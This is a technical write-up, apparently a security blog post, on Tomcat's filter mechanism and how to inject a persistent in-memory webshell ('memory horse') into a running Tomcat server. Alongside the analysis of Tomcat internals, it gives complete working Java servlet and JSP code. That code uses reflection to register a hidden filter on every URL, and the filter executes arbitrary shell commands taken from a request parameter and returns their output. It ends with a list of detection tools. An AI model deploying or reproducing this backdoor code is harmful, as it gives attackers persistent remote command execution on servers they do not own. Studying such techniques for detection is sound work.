# Java Security Of Tomcat Filter

## Preparation

### ServletContext

​ A ServletContext interface specified in the `Servlet` specification provides a view of all `Servlets` of the `Web` application, through which you can access various resources and functions of a `Web` application. When the `Web` container is started, it creates a corresponding `ServletContext` for each `Web` application, which represents the current `Web` application and is shared by all clients.

![](img/1.png)

​ When registering `filter` dynamically, you need to add `filter` related functions, and `ServletContext` can just meet this condition. There are `addFilter`, `addServlet` and `addListener` methods in `javax.servlet.servletContext`, that is, the corresponding implementation adds `Filter`, `Servlet` and `Listener`.

​ The methods to obtain `ServletContext` are:

- `this.getServletContext()`

- `this.getServletConfig().getServletContext();`

![](img/2.png)

​ You can see that what you get is actually an ApplicationContextFacade object, and this object is an encapsulation of the ApplicationContext instance.

### ApplicationContext

​ Corresponding to the `Tomcat` container, in order to meet the `Servlet` specification, it must include an implementation of the `ServletContext` interface. The Context container of `Tomcat` will contain an ApplicationContext`.

​ In `Tomcat`, the `org.apache.catalina.core.ApplicationContext` contains an implementation of the `ServletContext` interface, so we need to introduce the library `org.apache.catalina.core.ApplicationContext` to use it to get the context `StandardContext`.

### StandardContext[](https://www.cnblogs.com/nice0e3/p/14622879.html#standardcontext)

​ `Catalina` mainly includes `Connector` and `Container`. `StandardContext` is a `Container`, which is mainly responsible for processing incoming user requests. In fact, it is not processed by the `StandardContext`, but is handed over to the internal `valve` for processing.

A Context represents an external application, which contains multiple `Wrapper`, each `Wrapper` represents a `Servlet` definition. (The default `Service` service of `Tomcat` is `Catalina`)

### Filter Related Variables

| Name | Description |
| :------------------------: | :----------------------------------------------------------: |
| `filterMaps` variable | stores the array of `FilterMap`. In `FilterMap`, the FilterName` and the corresponding `URLPattern` are mainly stored in `FilterMap` |
| `filterDefs` variable | The array of `FilterDef` is stored. Our filter name, filter instance and other basic information are stored in `FilterDef` |
| `filterConfigs` variable | stores the array of `filterConfig`, and mainly stores information such as `FilterDef` and `Filter` objects in `FilterConfig` |
| `FilterChain` variable | filter chain, the `doFilter` method on this object can call `Filter` on the chain in turn |
| `ApplicationFilterChain` | Call filter chain |
| `ApplicationFilterConfig` | Get Filter |
| `ApplicationFilterFactory` | Assembly filter chain |
| `StandardContext` | Standard implementation class of the `Context` interface, a `Context` represents a `Web` application, which can contain multiple `Wrappers` |
| `StandardWrapperValve` | `Wrapper` standard implementation class, a `Wrapper` represents a `Servlet` |

## Process Analysis

- Environment construction

```java
package servlet;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "HelloServlet", value = "/HelloServlet")
public class HelloServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        PrintWriter writer = response.getWriter();
        writer.println("This is HelloServlet Page.");
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    }
}
```

```java
package filter;

import javax.servlet.*;
import javax.servlet.annotation.*;
import java.io.IOException;

@WebFilter(filterName = "HelloFilter", urlPatterns = "/HelloServlet")
public class HelloFilter implements Filter {
    public void init(FilterConfig config) {
        System.out.println("Filter init...");
    }

    public void destroy() {
        System.out.println("Filter Destroy...");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        System.out.println("Filter Start...");
        chain.doFilter(request, response);
    }
}
```

![](img/3.png)

​ In the next breakpoint in `doFilter`, the stack information is as follows:

```java
doFilter:19, HelloFilter (filter)
internalDoFilter:181, ApplicationFilterChain (org.apache.catalina.core)
doFilter:156, ApplicationFilterChain (org.apache.catalina.core)
invoke:167, StandardWrapperValve (org.apache.catalina.core)
invoke:9
0, StandardContextValve (org.apache.catalina.core)
invoke:494, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:130, StandardHostValve (org.apache.catalina.core)
invoke:93, ErrorReportValve (org.apache.catalina.valves)
invoke:682, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:617, Http11Processor (org.apache.coyote.http11)
process:63, AbstractProcessorLight (org.apache.coyote)
process:932, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1695, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
```

​ In the stack information, you can see the calls of four seed containers in the `Container` container, `StandardEngineValve`->`StandardHostValve`->`StandardContextValve`->`StandardWrapperValve`. Go back and follow up on `org.apache.catalina.core.StandardWrapperValve#invoke`, you can see that it creates a `FilterChain`, and then call its `doFilter` method.

![](img/4.png)

​ Follow up here `org.apache.catalina.core.ApplicationFilterFactory#createFilterChain` method to see how `filterChain` is created. First, judge the incoming `ServletRequest` object. If it is a `Request` instance, further obtain `filterChain` from it. If `filterChain` does not exist, create and set it into the `Request` object.

​ Then get the StandardContext object from the `wrapper` and call the `org.apache.catalina.core.StandardContext#findFilterMaps` method to get the `filterMaps`.

​ When the obtained `filterMaps` is not empty, traverse the `filterMaps`, call the `getFilterName` method to get `filterName`, pass the obtained `filterName` into the `org.apache.catalina.core.StandardContext#findFilterConfig` method to get `filterConfig`, and add the obtained `filterConfig` to the `filterChain`.

```java
public static ApplicationFilterChain createFilterChain(ServletRequest request,
                                                       Wrapper wrapper, Servlet servlet) {

  // If there is no servlet to execute, return null
  if (servlet == null)
    return null;

  // Create and initialize a filter chain object
  ApplicationFilterChain filterChain = null;
  if (request instanceof Request) {
    Request req = (Request) request;
    if (Globals.IS_SECURITY_ENABLED) {
      // Security: Do not recycle
      filterChain = new ApplicationFilterChain();
    } else {
      filterChain = (ApplicationFilterChain) req.getFilterChain();
      if (filterChain == null) {
        filterChain = new ApplicationFilterChain();
        req.setFilterChain(filterChain);
      }
    }
  } else {
    // Request dispatcher in use
    filterChain = new ApplicationFilterChain();
  }

  filterChain.setServlet(servlet);
  filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());

  // Acquire the filter mappings for this Context
  StandardContext context = (StandardContext) wrapper.getParent();
  FilterMap filterMaps[] = context.findFilterMaps();

  // If there are no filter mappings, we are done
  if ((filterMaps == null) || (filterMaps.length == 0))
    return (filterChain);

  // Acquire the information we will need to match filter mappings
  DispatcherType dispatcher =
    (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);

  String requestPath = null;
  Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);
  if (attribute != null){
    requestPath = attribute.toString();
  }

  String servletName = wrapper.getName();

  // Add the relevant path-mapped filters to this filter chain
  for (int i = 0; i < filterMaps.length; i++) {
    if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
      continue;
    }
    if (!matchFiltersURL(filterMaps[i], requestPath))
      continue;
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
      context.findFilterConfig(filterMaps[i].getFilterName());
    if (filterConfig == null) {
      // FIXME - log configuration problem
      continue;
    }
    filterChain.addFilter(filterConfig);
  }

  // Add filters that match on servlet
name second
  for (int i = 0; i < filterMaps.length; i++) {
    if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
      continue;
    }
    if (!matchFiltersServlet(filterMaps[i], servletName))
      continue;
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
      context.findFilterConfig(filterMaps[i].getFilterName());
    if (filterConfig == null) {
      // FIXME - log configuration problem
      continue;
    }
    filterChain.addFilter(filterConfig);
  }

  // Return the completed filter chain
  return filterChain;
}
```

​ Continue the previous stack analysis and follow up on the `org.apache.catalina.core.ApplicationFilterChain#doFilter` method, which first checks whether the `JVM` is in safe mode. Since it is `false` here, the `internalDoFilter` method will be called in the `else` statement.

![](img/5.png)

Follow up on the `org.apache.catalina.core.ApplicationFilterChain#internalDoFilter` method, first take out the `filterConfig` object from the `this,filters` array, then call the `org.apache.catalina.core.ApplicationFilterConfig#getFilter` method to obtain the `Filter` instance, and finally call its `doFilter` method.

![](img/6.png)

​ The above analysis shows that when creating `filterChain`, it mainly relies on `filterMaps`. Next, let’s see how to add malicious `filterMap` to `filterMaps`. There are two methods in `org.apache.catalina.core.StandardContext` to add `filterMap`, namely the `addFilterMap` method and the `addFilterMapBefore` method.

![](img/7.png)

Follow up on the `org.apache.catalina.core.StandardContext#validateFilterMap` method, which will judge the incoming `filterMap`. If `this.findFilterDef == null`, an exception will be thrown. Therefore, when constructing, you need to pay attention to constructing `filterDef` that meets the requirements.

![](img/8.png)

​ The `filterMap` and `filterDef` mentioned above are related to `filterConfig`, while the operations related to `filterConfig` in `org.apache.catalina.core.StandardContext` are only `filterStart` and `filterStop` methods. Therefore, when the application is running, you can only use reflection to dynamically modify the value of `filterConfigs`.

## Achievement

### Idea

​ The specific ideas for dynamically injecting `Filter` memory horse are as follows:

- Call the `addFilter` method of `ApplicationContext` to create a `filterDefs` object. It needs to reflect and modify the application's running state, and then change it back after adding it;
- Call the filterStart method of `StandardContext` to generate `filterConfigs`;
- Call `addMappingForUrlPatterns` of `ApplicationFilterRegistration` to generate `filterMaps`.

​ At the same time, in order to be compatible with certain special cases such as Shiro, you need to place the added filter`filter` first in filterMaps. You can modify the order in HashMap` by yourself, or you can directly add it to the first in filterMaps when calling the addFilterMapBefore of StandardContext.

### Demo

​ Let’s simply implement a malicious `Filter`:

```java
package filter;

import javax.servlet.*;
import javax.servlet.annotation.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

@WebFilter(filterName = "EvilFilter", urlPatterns = "/*")
public class EvilFilter implements Filter {
    public void init(FilterConfig config) throws ServletException {
    }

    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;

        if (req.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osProperty = System.getProperty("os.name");
            if (osProperty != null && osProperty.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
            String output = scanner.hasNext() ? scanner.next() : "";
            resp.getWriter().write(output);
            resp.getWriter().flush();
        }

        chain.doFilter(request, response);
    }
}
```

![](img/9.png)

### Dynamic Registration

According to the above analysis, dynamic injection of `filter` type memory horse requires the following steps:

- Create a malicious `filter`
- Encapsulate `filter` with `filterDef`
- Add `filterDef` to `filterDefs` and `filterConfigs`
- Create a new `filterMap` binds the URL to `filter` and adds it to `filterMaps`

​ Each time a request `createFilterChain` is requested, a filter chain will be generated dynamically based on this, and the `StandardContext` will remain until the end of the `Tomcat` life cycle, so the memory horse can stay until the `Tomcat` fails after restarting.

#### Servlet

```java
package servlet;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContex
t;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;

@WebServlet(name = "EvilServlet", value = "/EvilServlet")
public class EvilServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        super.doGet(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
        try {
            // Get standardContext through reflection
            ServletContext servletContext = request.getSession().getServletContext();
            Field context = servletContext.getClass().getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
            Field context1 = applicationContext.getClass().getDeclaredField("context");
            context1.setAccessible(true);
            StandardContext standardContext = (StandardContext) context1.get(applicationContext);

            String filterName = "h3rmesk1t";
            Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigs.setAccessible(true);
            Map filterConfigsMap = (Map) filterConfigs.get(standardContext);

            // Set malicious Filter
            if (filterConfigsMap.get(filterName) == null) {
                Filter filter = new Filter() {
                    @Override
                    public void init(FilterConfig config) {
                    }

                    @Override
                    public void destroy() {
                    }

                    @Override
                    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
                        HttpServletRequest httpServletRequest = (HttpServletRequest) request;
                        HttpServletResponse httpServletResponse = (HttpServletResponse) response;

                        if (httpServletRequest.getParameter("cmd") != null) {
                            boolean isLinux = true;
                            String osType = System.getProperty("os.name");
                            if (osType != null && osType.toLowerCase().contains("win")) {
                                isLinux = false;
                            }

                            String[] command = isLinux ? new String[]{"sh", "-c", httpServletRequest.getParameter("cmd")} : new String[]{"cmd.exe", "/c", httpServletRequest.getParameter("cmd")};
                            InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                            Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                            String output = scanner.hasNext() ? scanner.next() : "";
                            httpServletResponse.getWriter().write(output);
                            httpServletResponse.getWriter().flush();
                            return;
                        }
                        chain.doFilter(request, response);
                    }
                };

                //Reflection gets FilterDef, sets filter name and other parameters, call addFilterDef to add FilterDef
                Class<?> filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor<?> filterDefDeclaredConstructor = filterDef.getDeclaredConstructor();
                filterDefDeclaredConstructor.setAccessible(true);
                FilterDef filterDef1 = (Filte
rDef) filterDefDeclaredConstructor.newInstance();
                filterDef1.setFilter(filter);
                filterDef1.setFilterName(filterName);
                filterDef1.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef1);

                //Reflection gets FilterMap and sets the intercept path, call addFilterMapBefore to add FilterMap
                Class<?> filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor<?> filterMapDeclaredConstructor = filterMap.getDeclaredConstructor();
                filterMapDeclaredConstructor.setAccessible(true);
                FilterMap filterMap1 = (FilterMap) filterMapDeclaredConstructor.newInstance();
                filterMap1.addURLPattern("/*");
                filterMap1.setFilterName(filterName);
                filterMap1.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap1);

                // Reflection to get ApplicationFilterConfig
                Class<?> applicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> applicationFilterConfigDeclaredConstructor = applicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
                applicationFilterConfigDeclaredConstructor.setAccessible(true);
                ApplicationFilterConfig applicationFilterConfig1 = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef1);

                // Add malicious FilterConfig to FilterConfigs obtained from StandardContext
                filterConfigsMap.put(filterName, applicationFilterConfig1);
                response.getWriter().write("Filter Inject Successfully...");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](img/10.png)

![](img/11.png)

#### JSP

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    // Get standardContext through reflection
    ServletContext servletContext = request.getSession().getServletContext();
    Field context = servletContext.getClass().getDeclaredField("context");
    context.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
    Field context1 = applicationContext.getClass().getDeclaredField("context");
    context1.setAccessible(true);
    StandardContext standardContext = (StandardContext) context1.get(applicationContext);

    String filterName = "h3rmesk1t";
    Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigs.setAccessible(true);
    Map filterConfigsMap = (Map) filterConfigs.get(standardContext);

    // Set malicious Filter
    if (filterConfigsMap.get(filterName) == null) {
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig config) {
            }

            @Override
            public void destroy() {
            }

            @Override
            public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
                HttpServletRequest httpServletRequest = (HttpServletRequest) request;
                HttpServletResponse httpServletResponse = (HttpServletResponse) response;

                if (h
ttpServletRequest.getParameter("data") != null) {
                    boolean isLinux = true;
                    String osType = System.getProperty("os.name");
                    if (osType != null && osType.toLowerCase().contains("win")) {
                        isLinux = false;
                    }

                    String[] command = isLinux ? new String[]{"sh", "-c", httpServletRequest.getParameter("data")} : new String[]{"cmd.exe", "/c", httpServletRequest.getParameter("data")};
                    InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                    Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                    String output = scanner.hasNext() ? scanner.next() : "";
                    httpServletResponse.getWriter().write(output);
                    httpServletResponse.getWriter().flush();
                    return;
                }
                chain.doFilter(request, response);
            }
        };

        //Reflection gets FilterDef, sets filter name and other parameters, call addFilterDef to add FilterDef
        Class<?> filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Constructor<?> filterDefDeclaredConstructor = filterDef.getDeclaredConstructor();
        filterDefDeclaredConstructor.setAccessible(true);
        FilterDef filterDef1 = (FilterDef) filterDefDeclaredConstructor.newInstance();
        filterDef1.setFilter(filter);
        filterDef1.setFilterName(filterName);
        filterDef1.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef1);

        //Reflection gets FilterMap and sets the intercept path, call addFilterMapBefore to add FilterMap
        Class<?> filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Constructor<?> filterMapDeclaredConstructor = filterMap.getDeclaredConstructor();
        filterMapDeclaredConstructor.setAccessible(true);
        FilterMap filterMap1 = (FilterMap) filterMapDeclaredConstructor.newInstance();
        filterMap1.addURLPattern("/*");
        filterMap1.setFilterName(filterName);
        filterMap1.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap1);

        // Reflection to get ApplicationFilterConfig
        Class<?> applicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        Constructor<?> applicationFilterConfigDeclaredConstructor = applicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
        applicationFilterConfigDeclaredConstructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig1 = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef1);

        // Add malicious FilterConfig to FilterConfigs obtained from StandardContext
        filterConfigsMap.put(filterName, applicationFilterConfig1);
        out.println("Filter Inject Successfully...");
    }
%>
```

![](img/12.png)

## Check MemoryShell

Here are a few `mark` tools, and we will further study the memory horse killing:

- [Arthas](https://github.com/alibaba/arthas)
- [Copagent](https://github.com/LandGrey/copagent)
- [java-memshell-scanner](https://github.com/c0ny1/java-memshell-scanner)
- [shell-analyzer](https://github.com/4ra1n/shell-analyzer)